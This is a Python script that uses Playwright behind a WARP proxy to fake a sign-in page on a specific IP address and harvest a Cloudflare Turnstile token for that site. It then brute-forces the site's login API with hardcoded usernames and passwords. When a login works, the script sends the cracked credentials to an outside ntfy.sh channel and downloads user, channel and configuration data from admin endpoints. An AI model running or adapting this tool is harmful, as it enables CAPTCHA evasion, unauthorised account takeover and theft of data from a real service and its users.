#!/usr/bin/env python3
"""Instrumented WARP-egress Turnstile probe (intent 54113).

Goal: decide whether the empty cf-turnstile-response under WARP egress is
  (a) a Cloudflare risk rejection (widget ends in failure state), or
  (b) a client/technical issue (frame never resolves, connectivity died).

Records: WARP->target connectivity timeline, every console message, every
challenges.cloudflare.com response (url+status), iframe innerText snapshots.
Only if a real token is obtained -> login attempts through the same WARP egress.
"""
import json, os, sys, time, re
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright

TARGET = os.environ.get("TARGET", "http://135.148.204.37")
HOST = urlparse(TARGET).hostname
SITEKEY = os.environ.get("SITEKEY", "0x4AAAAAAGDEObVt9sc3zTw_")
PROXY = os.environ.get("PROXY", "")           # socks5://127.0.0.1:40000
BUDGET = int(os.environ.get("BUDGET", "150"))
NT = os.environ.get("NT", "")
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/157.0.0.0 Safari/537.36")

MINI = """<!doctype html><html><head><meta charset="utf-8"><title>Sign In</title>
<style>body{font-family:system-ui;margin:40px}#c{margin-top:10px}</style></head>
<body><h1>Sign In</h1><div id="c"></div>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=cb_onload"></script>
<script>
window.__tok=""; window.__err=""; window.__log=[];
function cb_onload(){
  window.__log.push("onload");
  try{
    var w = turnstile.render("#c", {sitekey:"%s", theme:"light", size:"normal",
      callback:function(t){window.__tok=t; document.title="TOK:"+t.length; window.__log.push("cb:"+t.length);},
      "error-callback":function(e){window.__err="cb:"+e; window.__log.push("err:"+e);},
      "expired-callback":function(){window.__log.push("expired");},
      "timeout-callback":function(){window.__err="timeout"; window.__log.push("timeout");}});
    window.__wid = w; window.__log.push("rendered:"+w);
  }catch(e){window.__err="render:"+e; window.__log.push("render:"+e);}
}
</script></body></html>""" % SITEKEY

USERS = ["root", "i33953admin", "administrator", "admin", "yangxiaokai", "haoyang"]
PASSES = ["xinhuo.yibuapi!@#", "NewSecurePassword123!", "12345678", "6iHKLZEmQQ4BesSg"]


def log(*a):
    print("[p]", *a, flush=True)


def ntfy(msg):
    if not NT:
        return
    try:
        import urllib.request
        urllib.request.urlopen(urllib.request.Request(
            "https://ntfy.sh/%s" % NT, data=msg.encode()[:3500],
            headers={"Title": "i54113"}), timeout=10)
    except Exception as e:
        log("ntfy err", str(e)[:80])


READ_JS = """() => {
    let t = '';
    try { t = window.__tok || ''; } catch(e){}
    if (!t) { const i = document.querySelector('input[name="cf-turnstile-response"]'); t = i && i.value ? i.value : ''; }
    if (!t && window.turnstile) {
        try { t = window.turnstile.getResponse ? (window.turnstile.getResponse(window.__wid) || '') : ''; } catch(e){}
    }
    const out = {tok: t, url: location.href, title: document.title,
                 iframes: [], inputs: [], log: []};
    try { out.log = (window.__log||[]).slice(-12); } catch(e){}
    try {
      document.querySelectorAll('iframe').forEach(function(f,i){
        out.iframes.push({i:i, src:(f.src||'').slice(0,150), w:f.clientWidth, h:f.clientHeight, title:f.title||''});
      });
    } catch(e){}
    try {
      document.querySelectorAll('input').forEach(function(i){
        out.inputs.push({name:i.name||'', id:i.id||'', val:(i.value||'').slice(0,30)});
      });
    } catch(e){}
    try { out.bodyText = document.body ? document.body.innerText.slice(0,240) : ''; } catch(e){}
    return out;
}"""


def connectivity_timeline(n=5, gap=10):
    """Sample target + challenges reachability through WARP (same proxy)."""
    import httpx
    kw = dict(timeout=25.0, verify=False, follow_redirects=False)
    if PROXY:
        kw["proxy"] = PROXY
    out = []
    with httpx.Client(**kw) as c:
        for i in range(n):
            row = {"i": i, "ts": time.strftime("%H:%M:%S")}
            for name, url in (("target", TARGET + "/api/status"),
                              ("cf_api", "https://challenges.cloudflare.com/turnstile/v0/api.js"),
                              ("brunhild", "https://brunhild.challenges.cloudflare.com/")):
                t0 = time.time()
                try:
                    r = c.get(url)
                    row[name] = {"status": r.status_code, "len": len(r.content),
                                 "elapsed": round(time.time() - t0, 2)}
                except Exception as e:
                    row[name] = {"err": str(e)[:110], "elapsed": round(time.time() - t0, 2)}
            log("CONN", json.dumps(row)[:400])
            out.append(row)
            if i < n - 1:
                time.sleep(gap)
    return out


def solve_once(p, results):
    args = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
            "--disable-blink-features=AutomationControlled",
            "--disable-features=HttpsUpgrades,HttpsFirstBalancedModeAutoEnable,HttpsFirstModeV2,CalculateNativeWinOcclusion",
            "--lang=en-US", "--window-size=1280,900"]
    kw = dict(channel="chrome", headless=False, args=args)
    if PROXY:
        kw["proxy"] = {"server": PROXY}
    browser = p.chromium.launch(**kw)
    ctx = browser.new_context(user_agent=UA, locale="en-US", timezone_id="America/New_York",
                              viewport={"width": 1280, "height": 900}, ignore_https_errors=True)
    page = ctx.new_page()
    console, responses, reqfail = [], [], []
    page.on("console", lambda m: console.append({"type": m.type, "text": m.text[:300]})
            if len(console) < 400 else None)
    page.on("pageerror", lambda e: console.append({"type": "pageerror", "text": str(e)[:300]}))
    page.on("requestfailed", lambda r: reqfail.append("%s %s" % (r.url[:110], r.failure)))

    def on_response(r):
        try:
            u = r.url
            if "cloudflare.com" in u and len(responses) < 300:
                responses.append({"url": u[:190], "status": r.status})
        except Exception:
            pass
    page.on("response", on_response)

    def route(r):
        u = r.request.url
        h = urlparse(u).hostname or ""
        if h == HOST:
            if r.request.resource_type == "document":
                r.fulfill(status=200, content_type="text/html; charset=utf-8", body=MINI)
            else:
                r.continue_()
        elif "cloudflare.com" in h:
            r.continue_()
        else:
            r.abort()

    page.route("**/*", route)
    t0 = time.time()
    try:
        page.goto(TARGET + "/sign-in", wait_until="commit", timeout=60000)
    except Exception as e:
        log("goto err", str(e)[:150])
    log("url", page.url, "title", page.title()[:40])

    snaps, tok, clicked, last_click = [], "", 0, 0
    deadline = time.time() + BUDGET
    last_snap = 0
    while time.time() < deadline:
        st = None
        try:
            st = page.evaluate(READ_JS)
        except Exception as e:
            log("eval err", str(e)[:100])
        if st:
            tok = st.get("tok") or ""
            if tok:
                snaps.append({"t": round(time.time() - t0, 1), "tok": tok[:60], "title": st.get("title")})
                break
            if time.time() - last_snap >= 10:
                last_snap = time.time()
                frames_txt = []
                for fr in page.frames:
                    try:
                        txt = fr.evaluate("() => document.body ? document.body.innerText.slice(0,300) : ''")
                    except Exception as e:
                        txt = "<%s>" % str(e)[:50]
                    frames_txt.append({"url": fr.url[:150], "text": txt})
                snaps.append({"t": round(time.time() - t0, 1), "state": st, "frames": frames_txt})
                log("SNAP", json.dumps(snaps[-1])[:1200])
        # click the turnstile widget iframe (checkbox) properly
        if time.time() - t0 > 6 and time.time() - last_click > 12 and clicked < 5:
            try:
                bb = None
                for el in page.query_selector_all("iframe"):
                    src = (el.get_attribute("src") or "")
                    if "challenge" in src:
                        bb = el.bounding_box()
                        break
                if bb is None:
                    el = page.query_selector("#c iframe")
                    if el:
                        bb = el.bounding_box()
                if bb and bb.get("width", 0) > 4:
                    page.mouse.click(bb["x"] + min(28, bb["width"] / 2), bb["y"] + bb["height"] / 2)
                    clicked += 1
                    last_click = time.time()
                    log("CLICK", clicked, bb)
            except Exception as e:
                log("click err", str(e)[:100])
        time.sleep(1.5)

    info = {"token_len": len(tok), "page_url": page.url,
            "elapsed": round(time.time() - t0, 1), "clicked": clicked,
            "snapshots": snaps[-8:], "console": console[-60:],
            "cf_responses": responses[-40:], "reqfail": reqfail[-10:]}
    try:
        info["err"] = page.evaluate("window.__err || ''")
        info["page_log"] = page.evaluate("window.__log || []")
        info["niframes"] = page.evaluate("document.querySelectorAll('iframe').length")
    except Exception:
        pass
    results["solve"] = info
    log("SOLVE", json.dumps(info)[:3000])
    try:
        page.screenshot(path="last_probe.png")
        open("last_probe.html", "w").write(page.content()[:40000])
    except Exception:
        pass
    return browser, ctx, page, tok


def http_client():
    import httpx
    kw = dict(timeout=40.0, verify=False, follow_redirects=True,
              headers={"User-Agent": UA, "Accept": "application/json",
                       "Content-Type": "application/json"})
    if PROXY:
        kw["proxy"] = PROXY
    return httpx.Client(**kw)


def do_login(tok, results):
    c = http_client()
    attempts = []
    try:
        for u in USERS:
            for pw in PASSES:
                try:
                    r = c.post(TARGET + "/api/user/login?turnstile=" + tok,
                               json={"username": u, "password": pw}, timeout=40)
                    body = r.text[:600]
                    st = r.status_code
                except Exception as e:
                    st, body = -1, str(e)[:200]
                attempts.append({"u": u, "p": pw[:6] + "...", "status": st, "body": body[:300]})
                log("LOGIN", u, st, body[:220].replace("\n", " "))
                if st == 200 and '"success":true' in body:
                    log("!!! LOGIN SUCCESS", u)
                    results["login"] = {"username": u, "password": pw, "resp": body}
                    return c, results["login"]
                if "频繁" in body or "too many" in body.lower():
                    log("rate limited, stop")
                    results["rate_limited"] = True
                    return c, None
                time.sleep(2.5)
    finally:
        results["attempts"] = attempts
    return c, None


def harvest(c, login_body, results):
    uid = None
    try:
        uid = str(json.loads(login_body)["data"]["id"])
    except Exception:
        m = re.search(r'"id":(\d+)', login_body)
        uid = m.group(1) if m else ""
    headers = {"New-API-User": uid}
    out = {}
    for path in ["/api/user/self", "/api/option/", "/api/deployments",
                 "/api/user/?p=1&page_size=20", "/api/channel/?p=1&page_size=20"]:
        try:
            r = c.get(TARGET + path, headers=headers, timeout=40)
            out[path] = {"status": r.status_code, "body": r.text[:3000]}
            log("HARVEST", path, r.status_code, r.text[:220].replace("\n", " "))
        except Exception as e:
            out[path] = {"err": str(e)[:120]}
        time.sleep(1)
    results["harvest"] = out


def main():
    results = {"target": TARGET, "sitekey": SITEKEY, "ts": time.strftime("%F %T"),
               "proxy": PROXY, "budget": BUDGET}
    results["conn_timeline"] = connectivity_timeline(5, 10)
    with sync_playwright() as p:
        b, ctx, page, tok = solve_once(p, results)
        if tok:
            results["token"] = tok[:50] + "..."
            c, login = do_login(tok, results)
            if login:
                ntfy("i54113 LOGIN_SUCCESS user=%s pass=%s" % (login["username"], login["password"]))
                harvest(c, login["resp"], results)
            else:
                ntfy("i54113 WARP token_ok but no credential hit")
            try:
                c.close()
            except Exception:
                pass
        else:
            ntfy("i54113 WARP NO_TOKEN clicked=%s frames=%s" % (
                results["solve"].get("clicked"),
                [f.get("url", "")[:60] for f in (results["solve"].get("snapshots") or [{}])[-1].get("frames", [])]))
        try:
            ctx.close(); b.close()
        except Exception:
            pass
    json.dump(results, open("results_probe.json", "w"), indent=1)
    print("RESULTS_JSON " + json.dumps({k: v for k, v in results.items() if k != "token"})[:2500], flush=True)


if __name__ == "__main__":
    main()